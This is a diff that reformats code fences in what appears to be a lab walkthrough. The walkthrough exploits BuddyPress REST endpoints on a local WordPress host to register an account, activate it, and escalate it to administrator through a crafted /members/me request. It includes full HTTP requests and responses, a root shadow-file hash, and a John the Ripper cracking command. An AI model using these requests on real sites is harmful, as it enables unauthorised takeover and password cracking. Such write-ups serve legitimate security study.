@@ -50,7 +50,7 @@ We will craft a request to create an account.
 
 Let's craft the request.
 
-'''
+```
 POST /wp-json/buddypress/v1/signup HTTP/1.1
 HOST: 192.168.0.16:7006
 Content-Type: application/json; charset=UTF-8
@@ -62,11 +62,11 @@ Content-Length: 107
 "user_name": "test7",
 "password": "test7"
 }
-'''
+```
 
  
 Response
-'''
+```
 Response
 HTTP/1.1 200 OK
 Date: Wed, 11 Jan 2023 20:45:36 GMT
@@ -84,15 +84,15 @@ Content-Type: application/json; charset=UTF-8
 
 
 [{"id":7,"user_login":"test2","registered":"2023-01-11T20:45:36","user_name":"test2","activation_key":"tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L","user_email":"test2@test.com","date_sent":"2023-01-11T20:45:36","count_sent":1,"meta":{"field_1":"test2","profile_field_ids":1}}]
-'''
+```
 
 Excellent we  have created an account with the creds
-'''
+```
 "user_login": "test2", 
 "user_email": "test2@test.com", 
 "user_name": "test2", 
 "password": "test2"
-'''
+```
 
 
 
@@ -115,7 +115,7 @@ On the buddypress rest api docs, if you scroll down only 2 divs you can find an 
  
 
 Lets craft a request for this endpoint to try and activate the account we just made.
- 
+``` 
 Request
 PUT /wp-json/buddypress/v1/signup/activate/tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L HTTP/1.1
 HOST: 192.168.0.16:7006
@@ -124,8 +124,8 @@ Content-Type: application/json; charset=UTF-8
 
 {
 }
-
- 
+```
+``` 
 Response
 HTTP/1.1 200 OK
 Date: Wed, 11 Jan 2023 20:57:16 GMT
@@ -141,7 +141,7 @@ Content-Type: application/json; charset=UTF-8
 
 
 [{"id":7,"user_login":"test2","registered":"2023-01-11T20:45:36","user_name":"test2","activation_key":"tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L","user_email":"test2@test.com","date_sent":"2023-01-11T20:45:36","count_sent":1,"meta":{"field_1":"test2","profile_field_ids":1}}]
-
+```
  
  
  
@@ -172,9 +172,9 @@ Lets create a group
 Use Burp Suite proxy and pause the requests and step over, follow the workflow to create a group, keep your eyes peeled for the X-WP-Nonce and Cookie.
 
 In the first section (Enter Group Name & Description)we find the cookie.
- 
+``` 
 Cookie: wp-settings-time-6=1673475146; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_1be8abdff50a11d493930c4498bcea44=test10%7C1673677770%7CSTA8r35d5LxrbTT1esDeqmnBnzlfEVSPNjacQkAg34s%7C13210b72a8690802f0be7455f6e7ff088c7d8bb305a21dbf389b64fcf6a111aa; wp-settings-time-11=1673504970; bp_new_group_id=29; bp_completed_create_steps=WyJncm91cC1kZXRhaWxzIl0%3D
-
+```
  
 
 Quickly step over the rest of the steps, you will be presented with the group landing page for the group you have just created. Notice in the header “Group Administrators” interesting?
@@ -192,7 +192,7 @@ X-WP-Nonce: 8af0f38b91
 Nice, we have found the nonce.
 
 If we now craft this request and send it to the vulnerable endpoint /wp-json/buddypress/v1/members/me we should be able to elevate our privs.
- 
+``` 
 POST /wp-json/buddypress/v1/members/me HTTP/1.1
 
 Host: 192.168.0.16:7006
@@ -207,12 +207,12 @@ Content-Length: 45
 {
         "roles": "administrator"
     }
-
+```
 
 The first response will not give the correct return response shown below, send this request again to yield similar results to the response below.
 
 
-
+```
 HTTP/1.1 200 OK
 Date: Thu, 12 Jan 2023 06:37:42 GMT
 Server: Apache/2.4.38 (Debian)
@@ -232,7 +232,7 @@ Content-Type: application/json; charset=UTF-8
 
 
 {"id":11,"name":"test10","user_login":"test10","link":"http:\/\/192.168.0.16:7006\/members\/test10\/","member_types":[],"roles":["administrator"],"capabilities":["switch_themes","edit_themes","activate_plugins","edit_plugins","edit_users","edit_files","manage_options","moderate_comments","manage_categories","manage_links","upload_files","import","unfiltered_html","edit_posts","edit_others_posts","edit_published_posts","publish_posts","edit_pages","read","level_10","level_9","level_8","level_7","level_6","level_5","level_4","level_3","level_2","level_1","level_0","edit_others_pages","edit_published_pages","publish_pages","delete_pages","delete_others_pages","delete_published_pages","delete_posts","delete_others_posts","delete_published_posts","delete_private_posts","edit_private_posts","read_private_posts","delete_private_pages","edit_private_pages","read_private_pages","delete_users","create_users","unfiltered_upload","edit_dashboard","update_plugins","delete_plugins","install_plugins","update_themes","install_themes","update_core","list_users","remove_users","promote_users","edit_theme_options","delete_themes","export","SPF Manage Options","SPF Manage Forums","SPF Manage User Groups","SPF Manage Permissions","SPF Manage Components","SPF Manage Admins","SPF Manage Users","SPF Manage Profiles","SPF Manage Toolbox","SPF Manage Plugins","SPF Manage Themes","SPF Manage Integration","bp_moderate","administrator"],"extra_capabilities":["administrator"],"registered_date":"2023-01-12T06:23:33","xprofile":{"groups":{"1":{"name":"Base","fields":{"1":{"name":"Name","value":{"raw":"test10","unserialized":["test10"],"rendered":"<p>test10<\/p>\n"}}}}}},"friendship_status":false,"friendship_status_slug":"","mention_name":"test10","avatar_urls":{"full":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=150&#038;r=g&#038;d=mm","thumb":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=50&#038;r=g&#038;d=mm"},"_links":{"self":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members\/11"}],"collection":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members"}]}}
-
+```
  
 Nice, see roles":["administrator"] let's check if we have elevated?
 
@@ -309,7 +309,7 @@ root:$6$.ctyXo1jtgIm.fCk$PgUb7kyoLElbx5IBNzw9KKDLnxlanLv15LY0pELWDvWR4mstD4kUnzB
 
 
 Understanding the shadow file format.
-
+```
 All fields are separated by a colon (:)
 Field 1 is username
 Field 2 first 3 chars are the hashing algo followed by the hash
@@ -322,7 +322,7 @@ Field 3 Days since last password change
 Field 4 minimum days required between password changes
 Field 5 maximum number of days the password is valid
 Field 6 The number of days before password is to expire that user is warned that his/her password must be changed
-
+```
 We can save the shadow file in the working directory and use john the ripper to compare the target hash vs a wordlist that the tool will hash with the SHA-512 algo. If a match is found it will present us with the unhashed value. https://github.com/openwall/john
 
 john --wordlist=/usr/share/wordlists/john.lst --rules shadow
